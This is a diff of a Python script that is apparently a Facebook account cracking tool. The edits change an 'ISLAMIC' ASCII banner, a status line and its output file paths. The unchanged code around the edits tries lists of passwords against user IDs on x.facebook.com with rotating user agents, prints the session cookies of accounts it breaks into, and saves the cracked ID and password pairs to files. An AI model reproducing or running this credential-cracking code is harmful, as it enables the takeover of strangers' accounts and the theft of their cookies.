@@ -78,7 +78,8 @@ for xd in range(10000):
     ugen.append(uaku2)
 
 os.system("xdg-open https://github.com/U7P4L-IN ")
-logo = ("""                                                                                                                                                                                                                                                                                                                                                                    
+logo = ("""   
+                                                                                                                                                                                                                                                                                                                                                                 
 IIIIIIIIII   SSSSSSSSSSSSSSS MMMMMMMM               MMMMMMMM               AAA               IIIIIIIIIILLLLLLLLLLL                              NNNNNNNN        NNNNNNNNIIIIIIIIII
 I::::::::I SS:::::::::::::::SM:::::::M             M:::::::M              A:::A              I::::::::IL:::::::::L                              N:::::::N       N::::::NI::::::::I
 I::::::::IS:::::SSSSSS::::::SM::::::::M           M::::::::M             A:::::A             I::::::::IL:::::::::L                              N::::::::N      N::::::NI::::::::I
@@ -95,6 +96,7 @@ II::::::IISSSSSSS     S:::::SM::::::M               M::::::M   A:::::A          
 I::::::::IS::::::SSSSSS:::::SM::::::M               M::::::M  A:::::A               A:::::A  I::::::::IL::::::::::::::::::::::L                 N::::::N       N:::::::NI::::::::I
 I::::::::IS:::::::::::::::SS M::::::M               M::::::M A:::::A                 A:::::A I::::::::IL::::::::::::::::::::::L                 N::::::N        N::::::NI::::::::I
 IIIIIIIIII SSSSSSSSSSSSSSS   MMMMMMMM               MMMMMMMMAAAAAAA                   AAAAAAAIIIIIIIIIILLLLLLLLLLLLLLLLLLLLLLLL                 NNNNNNNN         NNNNNNNIIIIIIIIII                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      qqq                                                                                                                                                                                                                                                                                                                                                                                                                                                        
+
 """)
 
 class Main:
@@ -224,7 +226,7 @@ def rcrack1(uid,pwx,tl):
         for ps in pwx:
             pro = random.choice(ugen)
             session = requests.Session()
-            sys.stdout.write('\r[\033[1;92mISLAMIC-CYBER\033[1;97m] [%s/%s] [\033[1;92mOK\033[1;97m:-\033[1;92m%s\033[1;97m] [\033[1;91mCP\033[1;97m:-\033[1;91m%s\033[1;97m] \r'%(loop,tl,len(oks),len(cps))),
+            sys.stdout.write('\r[\033[1;92mISLAMIc-CYBER\033[1;97m] [%s/%s] [\033[1;92mOK\033[1;97m:-\033[1;92m%s\033[1;97m] [\033[1;91mCP\033[1;97m:-\033[1;91m%s\033[1;97m] \r'%(loop,tl,len(oks),len(cps))),
             sys.stdout.flush()
             free_fb = session.get('https://x.facebook.com').text
             log_data = {
@@ -260,14 +262,14 @@ def rcrack1(uid,pwx,tl):
                 cid = coki[7:22]
                 print(f"\033[38;5;46m[ISLAMIC-OK🌻] {uid}|{ps}")
                 print(f"\n[COOKIE🎁] : {coki}")
-                open('/sdcard/Darkhackerv3/ok.txt', 'a').write( uid+' | '+ps+'\n')
+                open('/sdcard/U7P4L-IN/ok.txt', 'a').write( uid+' | '+ps+'\n')
                 oks.append(uid)
                 break
             elif 'checkpoint' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[82:97]
                 print(f"\x1b[38;5;196m[ISLAMIC-CP❌] {uid}|{ps}")
-                open('/sdcard/ISLAMIc-CP.txt', 'a').write( uid+' | '+ps+' \n')
+                open('/sdcard/ISLAMIC-CP.txt', 'a').write( uid+' | '+ps+' \n')
                 cps.append(uid)
                 break
             else:
